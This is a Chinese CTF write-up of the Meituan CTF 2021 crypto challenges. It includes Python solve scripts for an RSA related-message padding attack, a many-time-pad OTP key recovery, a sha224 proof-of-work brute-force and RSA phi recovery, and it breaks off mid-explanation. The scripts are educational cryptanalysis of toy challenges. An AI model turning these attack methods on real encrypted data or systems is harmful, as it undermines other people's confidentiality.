  <entry>
    <title>MTCTF密码部分wp</title>
    <url>/2021/05/25/MTCTF%E5%AF%86%E7%A0%81%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h1 id="美团CTF密码部分wp"><a href="#美团CTF密码部分wp" class="headerlink" title="美团CTF密码部分wp"></a>美团CTF密码部分wp</h1><p>比赛的时候做出了easy_RSA，然后random的RSA部分做了一半，可惜不懂pwn模块，没写出nc爆破的脚本。RSAsig在第二天复现即将做出来的时候，平台靶机关了，难受。</p>
<span id="more"></span>
<h2 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h2><p>经典套娃题</p>
<h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">0x9371c61a2b760109781f229d43c6f05b58de65aa2a674ff92334cb5219132448d72c1293c145eb6f35e58791669f2d8d3b6ce506f4b3543beb947cf119f463a00bd33a33c4d566c4fd3f4c73c697fa5f3bf65976284b9cc96ec817241385d480003cdda9649fa0995b013e66f583c9a9710f7e18396fbf461cb31720f94a0f79L</span></span><br><span class="line">e=<span class="number">0x3</span></span><br><span class="line">encrypt(m)=<span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffbbd5a5e1a10f686c3f240e85d011f6c8b968d1d607b2e1d5a78ad6947b7d3ec8f33ad32489befab601fe745164e4ff4aed7630da89af7f902f6a1bf7266c9c95b29f2c69c33b93a709f282d43b10c61b1a1fe76f5fee970780d7512389fd1L</span></span><br><span class="line">encrypt(m+<span class="number">1</span>)=<span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffc5c26b0c12bcff9f697f274f59f0e55a147768332fc1f1bac5bbc8f9bb508104f232bdd20091d26adc52e36feda4a156eae7dce4650f83fabc828fdcfb01d25efb98db8b94811ca855a6aa77caff991e7b986db844ff7a140218449aaa7e8L</span></span><br></pre></td></tr></table></figure>
<h4 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h4><p>原题，一个字不改的，直接上exp了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getM2</span>(<span class="params">a,b,c1,c2,n,e</span>):</span></span><br><span class="line">    a3 = <span class="built_in">pow</span>(a,e,n)</span><br><span class="line">    b3 = <span class="built_in">pow</span>(b,e,n)</span><br><span class="line">    first = c1-a3*c2+<span class="number">2</span>*b3</span><br><span class="line">    first = first % n</span><br><span class="line">    second = e*b*(a3*c2-b3)</span><br><span class="line">    second = second % n</span><br><span class="line">    third = second*inverse(first,n)</span><br><span class="line">    third = third % n</span><br><span class="line">    fourth = (third+b)*inverse(a,n)</span><br><span class="line">    <span class="keyword">return</span> fourth % n</span><br><span class="line">e=<span class="number">0x3</span></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line">b=-<span class="number">1</span></span><br><span class="line">c1=<span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffbbd5a5e1a10f686c3f240e85d011f6c8b968d1d607b2e1d5a78ad6947b7d3ec8f33ad32489befab601fe745164e4ff4aed7630da89af7f902f6a1bf7266c9c95b29f2c69c33b93a709f282d43b10c61b1a1fe76f5fee970780d7512389fd1</span></span><br><span class="line">c2=<span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffc5c26b0c12bcff9f697f274f59f0e55a147768332fc1f1bac5bbc8f9bb508104f232bdd20091d26adc52e36feda4a156eae7dce4650f83fabc828fdcfb01d25efb98db8b94811ca855a6aa77caff991e7b986db844ff7a140218449aaa7e8</span></span><br><span class="line">padding2=<span class="number">1</span></span><br><span class="line">n=<span class="number">0x9371c61a2b760109781f229d43c6f05b58de65aa2a674ff92334cb5219132448d72c1293c145eb6f35e58791669f2d8d3b6ce506f4b3543beb947cf119f463a00bd33a33c4d566c4fd3f4c73c697fa5f3bf65976284b9cc96ec817241385d480003cdda9649fa0995b013e66f583c9a9710f7e18396fbf461cb31720f94a0f79</span></span><br><span class="line">m = getM2(a,b,c1,c2,n,e)-padding2</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>解出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">the key is :everything_is_easy_in_this_question</span><br></pre></td></tr></table></figure>
<p>即为压缩包密码，然后进入第二层</p>
<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p>原理参考：<a href="https://www.anquanke.com/post/id/158944">浅析RSA Padding Attack</a></p>
<p>脚本参考：<a href="https://xz.aliyun.com/t/6459">深入浅出RSA在CTF中的攻击套路</a></p>
<h3 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h3><p>题目给了提示，one_time_cipher，一次一密。额，又是原题，但不完全是。需要修改一下。</p>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">280316470206017f5f163a3460100b111b2c254e103715600f13,</span><br><span class="line">091b0f471d05153811122c70340c0111053a394e0b39500f0a18,</span><br><span class="line">4638080a1e49243e55531a3e23161d411a362e4044111f374409,</span><br><span class="line">0e0d15470206017f59122935601405421d3a244e10371560140f,</span><br><span class="line">031a08080e1a540d62327f242517101d4e2b2807177f13280511,</span><br><span class="line">0a090f001e491d2c111d3024601405431a36231b083e022c1d,</span><br><span class="line">16000406080c543854077f24280144451c2a254e093a0333051a,</span><br><span class="line">02050701120a01334553393f32441d5e1b716027107f19334417,</span><br><span class="line">131f15470800192f5d167f352e0716481e2b29010a7139600c12,</span><br><span class="line">1609411e141c543c501d7f232f0812544e2b2807177f00320b1f,</span><br><span class="line">0a090c470a1c1d3c5a1f2670210a0011093a344e103715600712,</span><br><span class="line">141e04040f49153142043a22601711520d3a331d0826</span><br></pre></td></tr></table></figure>
<h4 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h4><p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class="line"><span class="comment"># @author intrd - http://dann.com.br/ </span></span><br><span class="line"><span class="comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="string">"280316470206017f5f163a3460100b111b2c254e103715600f13"</span></span><br><span class="line">c2 = <span class="string">"091b0f471d05153811122c70340c0111053a394e0b39500f0a18"</span></span><br><span class="line">c3 = <span class="string">"4638080a1e49243e55531a3e23161d411a362e4044111f374409"</span></span><br><span class="line">c4 = <span class="string">"0e0d15470206017f59122935601405421d3a244e10371560140f"</span></span><br><span class="line">c5 = <span class="string">"031a08080e1a540d62327f242517101d4e2b2807177f13280511"</span></span><br><span class="line">c6 = <span class="string">"0a090f001e491d2c111d3024601405431a36231b083e022c1d"</span></span><br><span class="line">c7 = <span class="string">"16000406080c543854077f24280144451c2a254e093a0333051a"</span></span><br><span class="line">c8 = <span class="string">"02050701120a01334553393f32441d5e1b716027107f19334417"</span></span><br><span class="line">c9 = <span class="string">"131f15470800192f5d167f352e0716481e2b29010a7139600c12"</span></span><br><span class="line">c10 = <span class="string">"1609411e141c543c501d7f232f0812544e2b2807177f00320b1f"</span></span><br><span class="line">c11 = <span class="string">"0a090c470a1c1d3c5a1f2670210a0011093a344e103715600712"</span></span><br><span class="line">ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]</span><br><span class="line"><span class="comment"># The target ciphertext we want to crack</span></span><br><span class="line">target_cipher = <span class="string">"141e04040f49153142043a22601711520d3a331d0826"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XORs two string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span>(<span class="params">a, b</span>):</span>     <span class="comment"># xor two strings (trims the longer input)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># To store the final key</span></span><br><span class="line">final_key = [<span class="literal">None</span>]*<span class="number">150</span></span><br><span class="line"><span class="comment"># To store the positions we know are broken</span></span><br><span class="line">known_key_positions = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># For each ciphertext</span></span><br><span class="line"><span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">	counter = collections.Counter()</span><br><span class="line">	<span class="comment"># for each other ciphertext</span></span><br><span class="line">	<span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">		<span class="keyword">if</span> current_index != index: <span class="comment"># don't xor a ciphertext with itself</span></span><br><span class="line">			<span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(strxor(ciphertext.decode(<span class="string">'hex'</span>), ciphertext2.decode(<span class="string">'hex'</span>))): <span class="comment"># Xor the two ciphertexts</span></span><br><span class="line">				<span class="comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)</span></span><br><span class="line">				<span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span> <span class="comment"># Increment the counter at this index</span></span><br><span class="line">	knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class="line">	<span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">		<span class="comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class="line">		<span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line">	<span class="comment">#print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class="line">	xor_with_spaces = strxor(ciphertext.decode(<span class="string">'hex'</span>),<span class="string">' '</span>*<span class="number">150</span>)</span><br><span class="line">	<span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">		<span class="comment"># Store the key's value at the correct position</span></span><br><span class="line">		final_key[index] = xor_with_spaces[index].encode(<span class="string">'hex'</span>)</span><br><span class="line">		<span class="comment"># Record that we known the key at this position</span></span><br><span class="line">		known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)</span></span><br><span class="line">final_key_hex = <span class="string">''</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">'00'</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line"><span class="comment"># Xor the currently known key with the target cipher</span></span><br><span class="line">output = strxor(target_cipher.decode(<span class="string">'hex'</span>),final_key_hex.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"Fix this sentence:"</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">''</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">'*'</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(output)])+<span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WAIT.. MANUAL STEP HERE </span></span><br><span class="line"><span class="comment"># This output are printing a * if that character is not known yet</span></span><br><span class="line"><span class="comment"># fix the missing characters like this: "Let*M**k*ow if *o{*a" = "cure, Let Me know if you a"</span></span><br><span class="line"><span class="comment"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class="line"><span class="comment"># and we have our key to fix the entire text!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sys.exit(0) #comment and continue if u got a good key</span></span><br><span class="line">list1=<span class="string">' abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line"></span><br><span class="line">			target_plaintext = <span class="string">"r{0}e{1}{2} answer successly"</span>.<span class="built_in">format</span>(list1[i],list1[j],list1[k])</span><br><span class="line"><span class="comment"># print "Fixed:"</span></span><br><span class="line"><span class="comment"># print target_plaintext+"\n"</span></span><br><span class="line"></span><br><span class="line">			key = strxor(target_cipher.decode(<span class="string">'hex'</span>),target_plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print "Decrypted msg:"</span></span><br><span class="line"><span class="comment">#for cipher in ciphers:</span></span><br><span class="line"><span class="comment">#	print strxor(cipher.decode('hex'),key)</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">'flag{'</span> <span class="keyword">in</span> key:</span><br><span class="line">				<span class="built_in">print</span> target_plaintext</span><br><span class="line">				<span class="built_in">print</span> <span class="string">"\nPrivate key recovered: "</span>+key+<span class="string">"\n"</span></span><br><span class="line">				<span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">					<span class="built_in">print</span> strxor(cipher.decode(<span class="string">'hex'</span>),key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print "Fixed:"</span></span><br><span class="line"><span class="comment"># print target_plaintext+"\n"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># key = strxor(target_cipher.decode('hex'),target_plaintext)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print "Decrypted msg:"</span></span><br><span class="line"><span class="comment"># for cipher in ciphers:</span></span><br><span class="line"><span class="comment"># 	print strxor(cipher.decode('hex'),key)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print "\nPrivate key recovered: "+key+"\n"</span></span><br></pre></td></tr></table></figure>
<p>得到的密文为<code>r*e** answer succks*ly</code></p>
<p>爆破恢复+猜测后，得到实际密文:<code>rrect answer successly</code></p>
<p>明文段落：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Now you need to use th</span><br><span class="line">own flag as the key of</span><br><span class="line"> Time Pad Encryptin. N</span><br><span class="line">hat you have passed th</span><br><span class="line">evious RSA test, this </span><br><span class="line">lenge is not particula</span><br><span class="line">please get the true me</span><br><span class="line">difficult for you. It </span><br><span class="line">ust simple encryption.</span><br><span class="line">pe you can solve this </span><br><span class="line">lem quickly and get th</span><br><span class="line">rrect answer successly</span><br></pre></td></tr></table></figure>
<p>得到flag：<code>flag{it_1s_P@dd1n_@nd_</code>好恶心啊，缺了几个字符。</p>
<p>仔细看明文出来的，缺了字母，恶心坏了。</p>
<p>缺了4个字节，最后一个字节肯定是<code>}</code>，复原第八行明文后异或爆破前三位，得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_bytes</span>(<span class="params">key_stream, message</span>):</span></span><br><span class="line">    length = <span class="built_in">min</span>(<span class="built_in">len</span>(key_stream), <span class="built_in">len</span>(message))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([key_stream[i]^ message[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length)])</span><br><span class="line"> </span><br><span class="line">message = <span class="string">b"difficult for you. It is j"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            key_stream = <span class="string">b'flag{it_1s_P@dd1n_@nd_'</span>+<span class="string">f'<span class="subst">{<span class="built_in">chr</span>(i)}</span>'</span>.encode()+<span class="string">f'<span class="subst">{<span class="built_in">chr</span>(j)}</span>'</span>.encode()+<span class="string">f'<span class="subst">{<span class="built_in">chr</span>(k)}</span>'</span>.encode()+<span class="string">b'}'</span></span><br><span class="line">            cipher = xor_bytes(key_stream, message)</span><br><span class="line">            <span class="keyword">if</span> cipher.<span class="built_in">hex</span>() == <span class="string">"02050701120a01334553393f32441d5e1b716027107f19334417"</span>:</span><br><span class="line">                <span class="built_in">print</span>(key_stream)</span><br><span class="line">                <span class="built_in">print</span>(cipher.<span class="built_in">hex</span>())</span><br><span class="line">                <span class="built_in">print</span>(xor_bytes(key_stream, cipher))</span><br></pre></td></tr></table></figure>
<h4 id="参考链接：-1"><a href="#参考链接：-1" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/">alexctf2k17-crypto100</a>（类似例题有杭电2019week1）</p>
<p><a href="https://www.wkr.moe/ctf/536.html">Wankko ReeのBlog</a></p>
<h2 id="RSAsig"><a href="#RSAsig" class="headerlink" title="RSAsig"></a>RSAsig</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> Crypto.Util.number</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> proof_of_work <span class="keyword">import</span> proof_of_work</span><br><span class="line">banner = <span class="string">'''</span></span><br><span class="line"><span class="string"> ____                             ____  _                   _</span></span><br><span class="line"><span class="string">/ ___|  ___  ___ _   _ _ __ ___  / ___|(_) __ _ _ __   __ _| |_ _   _ _ __ ___</span></span><br><span class="line"><span class="string">\___ \ / _ \/ __| | | | '__/ _ \ \___ \| |/ _` | '_ \ / _` | __| | | | '__/ _ \</span></span><br><span class="line"><span class="string"> ___) |  __/ (__| |_| | | |  __/  ___) | | (_| | | | | (_| | |_| |_| | | |  __/</span></span><br><span class="line"><span class="string">|____/ \___|\___|\__,_|_|  \___| |____/|_|\__, |_| |_|\__,_|\__|\__,_|_|  \___|</span></span><br><span class="line"><span class="string">                                          |___/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dosend</span>(<span class="params">m</span>):</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dorecv</span>():</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> sys.stdin.readline().strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>():</span></span><br><span class="line">    random_generator = Random.new().read</span><br><span class="line">    rsa = RSA.generate(<span class="number">1024</span>, random_generator)</span><br><span class="line">    private_pem = rsa</span><br><span class="line">    <span class="keyword">return</span> private_pem</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    rsakey = gen()</span><br><span class="line">    a = RSA._RSAobj(<span class="literal">None</span>, rsakey)</span><br><span class="line">    modBits = Crypto.Util.number.size(rsakey.n)</span><br><span class="line">    k = ceil_div(modBits,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">        dosend(<span class="string">"Welcome to this secure cryptosystem:"</span>)</span><br><span class="line">        dosend(<span class="string">"1.Get flag.\n2.Have my signature.\n3.Exit.\n4.Get my key."</span>)</span><br><span class="line">        dosend(<span class="string">"What is your choice?"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            option = <span class="built_in">int</span>(dorecv().strip())</span><br><span class="line">            <span class="keyword">if</span> option == <span class="number">1</span>:</span><br><span class="line">                cipher = rsakey.encrypt(flag, k)</span><br><span class="line">                dosend(b64encode(cipher[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="number">2</span>:</span><br><span class="line">                dosend(<span class="string">"What message to sign?"</span>)</span><br><span class="line">                m = <span class="built_in">int</span>(dorecv().strip())</span><br><span class="line">                sign = a.sign(m, k)</span><br><span class="line">                dosend(<span class="built_in">str</span>(sign[<span class="number">0</span>][<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="number">3</span>:</span><br><span class="line">                dosend(<span class="string">"Bye~"</span>)</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="number">4</span>:</span><br><span class="line">                dosend(<span class="built_in">str</span>(rsakey.n))</span><br><span class="line">                dosend(<span class="built_in">str</span>(rsakey.e))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dosend(<span class="string">"Invalid choice!"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            exit()</span><br><span class="line"><span class="comment">#if  proof_of_work():</span></span><br><span class="line"><span class="comment">#    exit()</span></span><br><span class="line"><span class="comment">#signal.alarm(20)</span></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>第一关为sha224爆破。基操，直接贴exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">str1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):	</span><br><span class="line">			message = <span class="string">'{0}{1}{2}Vw3UrFafQ94N5k4QB'</span>.<span class="built_in">format</span>(str1[i],str1[j],str1[k])</span><br><span class="line">			<span class="comment">#print(message)</span></span><br><span class="line">			m = hashlib.sha224()</span><br><span class="line">			m.update(message.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">			c = m.hexdigest()</span><br><span class="line">			<span class="keyword">if</span> c == <span class="string">'6da53efa50c3ef1481cc0f403212262dd1bcead74d9f0b34f306318c'</span>:</span><br><span class="line">				<span class="built_in">print</span> (message)</span><br><span class="line">				<span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
<p>爆破前3位字符，然后进下一关。</p>
<p>疑似非预期了，昨天早上复现到一半，机器被关了，连不上了。根据VN的wp和大佬的指点，可以想象到解法步骤：</p>
<p>点1拿到base64，将base64转为十进制数，拿到2里签名。签名出来直接转byte就是flag。</p>
<p><del>人麻了，人麻了。人麻了？人麻了！</del></p>
<h2 id="random（第一关RSA部分）"><a href="#random（第一关RSA部分）" class="headerlink" title="random（第一关RSA部分）"></a>random（第一关RSA部分）</h2><p>第一关都没过，还没做到LCG。</p>
<h3 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h3><h4 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsa_sign:pow(m,d,p)</span><br><span class="line">e*d+n:3563329754048976946603729466426236052000141166700839903323255268203185709020494450173369806214666850943076188175778667508946270492708397447950521732324059148390232744011000065982865974194986726739638097566303135573072114448615095262066554751858952042395375417151593676621825939069783767865138657768553767717034970</span><br><span class="line">e*d-n:3563121718917234588723786463275555826875232380691165919033718924958406353810813480184744219046717838078497090403751007254545187720107602959381881715875898243474504999760208133192572812110967142474619366650504948619637909653723376917174456091396220576841259798792078769198369072982063716206690589554604992470787752</span><br><span class="line">tmp = e*d</span><br><span class="line">please sign the message with p:you_can_get_more_message</span><br><span class="line">please enter sign:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h4><p>先简单的二元一次方程解出<code>n</code>和<code>e*d</code>的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len(bin(tmp))-2=1039</span><br><span class="line">len(bin(n))-2=1024</span><br></pre></td></tr></table></figure>
<p>可以发现，两者差了15位。</p>
<script type="math/tex; mode=display">
\because \,\,e\,\,\cdot \,\,d\,\,\equiv \,\,1\left( mod\,\,\varphi \left( n \right) \right) 
\\
\therefore \,\,e\,\,\cdot \,\,d\,\,-1 =\,\,k\,\,\cdot \,\,\varphi \left( n \right) \,\,, k\in N
\\
\because \,\,k\,\,=\,\,\frac{\left( e\,\,\cdot \,\,d\,\,-\,\,1 \right)}{\varphi \left( n \right)}
\\
\therefore \,\,k\,\,\in \,\,\left[ 2^{15},2^{16} \right]</script><p>写一个脚本爆破phi的值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phi=[]  <span class="comment">#11个</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">15</span>,<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">	<span class="keyword">if</span> ((tmp-<span class="number">1</span>) // i) * i != tmp-<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		phi.append((tmp-<span class="number">1</span>) // i)	</span><br></pre></td></tr></table></figure>
<p>可以得到有11个可能的phi值。</p>
<p>随后用z3爆破，得到p和q</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x=Int(<span class="string">'x'</span>)</span><br><span class="line">y=Int(<span class="string">'y'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	s.add(x*y==n)</span><br><span class="line">	s.add(x+y==n-phi[i]+<span class="number">1</span>)</span><br><span class="line">	s.add(x&gt;<span class="number">0</span>)</span><br><span class="line">	s.add(y&gt;<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> s.check()!=sat:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(phi[i])</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">'x='</span>,s.model()[x])</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">'y='</span>,s.model()[y])</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">10980405508174271259925333166343579553719061316941945190323939083665489902286168861229664589365210026388298173482496757264697996404794685064674668272479771</span></span><br><span class="line">q = <span class="number">9473016801951797771267846445459738473973421588058140695253031511700407533935872397264731631901174665159278878658035094231228063878480145556088206641042779</span></span><br><span class="line">phi=<span class="number">104017565871178939971501575340112562454393004836992144768171622389677604840484994312793583974506432289548886013830127200541386300397244284320008224080452437410449815269897363953401430206474104816882552899007591140131802079961736224008071736969511510673117632180401571196581547933965545949203486211512709601060</span></span><br><span class="line"><span class="comment">#k=34256</span></span><br></pre></td></tr></table></figure>
<p>然后的操作比较复杂，先素数分解tmp，得到因子</p>
<p><img src="https://i.loli.net/2021/05/26/VToBR4vLhIWsUKd.png" alt="image-20210526080806673"></p>
<p>279位显然是可以忽略的，然后用以下代码判断e的因子。</p>
